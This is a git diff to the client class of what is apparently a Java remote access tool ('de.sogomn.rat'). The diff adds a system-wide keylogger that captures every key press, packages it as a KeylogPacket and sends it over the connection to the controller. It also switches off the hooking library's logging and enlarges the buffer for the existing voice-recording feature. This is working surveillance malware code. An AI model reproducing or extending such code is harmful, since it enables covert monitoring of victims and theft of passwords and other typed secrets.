@@ -1,12 +1,18 @@
 package de.sogomn.rat;
 
+import java.util.logging.Level;
+import java.util.logging.Logger;
+
 import org.jnativehook.GlobalScreen;
+import org.jnativehook.keyboard.NativeKeyEvent;
+import org.jnativehook.keyboard.NativeKeyListener;
 
 import de.sogomn.engine.util.FileUtils;
 import de.sogomn.rat.gui.ChatWindow;
 import de.sogomn.rat.gui.IGuiController;
 import de.sogomn.rat.packet.ChatPacket;
 import de.sogomn.rat.packet.IPacket;
+import de.sogomn.rat.packet.KeylogPacket;
 import de.sogomn.rat.packet.VoicePacket;
 import de.sogomn.rat.util.Constants;
 import de.sogomn.rat.util.VoiceRecorder;
@@ -16,18 +22,38 @@ public final class Client implements IConnectionObserver, IGuiController {
 	private ActiveConnection connection;
 	
 	private ChatWindow chat;
+	private NativeKeyListener keylogger;
 	
-	private static final int VOICE_BUFFER_SIZE = 1024 << 8;
+	private static final int VOICE_BUFFER_SIZE = 1024 << 12;
 	private static final int CONNECTION_INTERVAL = 5000;
 	
 	public Client(final ActiveConnection connection) {
 		this.connection = connection;
 		
 		chat = new ChatWindow();
+		keylogger = new NativeKeyListener() {
+			@Override
+			public void nativeKeyPressed(final NativeKeyEvent n) {
+				final int keyCode = n.getKeyCode();
+				final KeylogPacket packet = new KeylogPacket(keyCode);
+				
+				connection.addPacket(packet);
+			}
+			
+			@Override
+			public void nativeKeyReleased(final NativeKeyEvent n) {
+				//...
+			}
+			
+			@Override
+			public void nativeKeyTyped(final NativeKeyEvent n) {
+				//...
+			}
+		};
 		
 		connection.setObserver(this);
-		
 		chat.addListener(this);
+		GlobalScreen.addNativeKeyListener(keylogger);
 	}
 	
 	private void handleVoiceRequest(final ActiveConnection connection) {
@@ -154,6 +180,8 @@ public final class Client implements IConnectionObserver, IGuiController {
 	}
 	
 	public static void main(final String[] args) {
+		Logger.getLogger(GlobalScreen.class.getPackage().getName()).setLevel(Level.OFF);
+		
 		final Thread hook = new Thread(() -> {
 			try {
 				GlobalScreen.unregisterNativeHook();
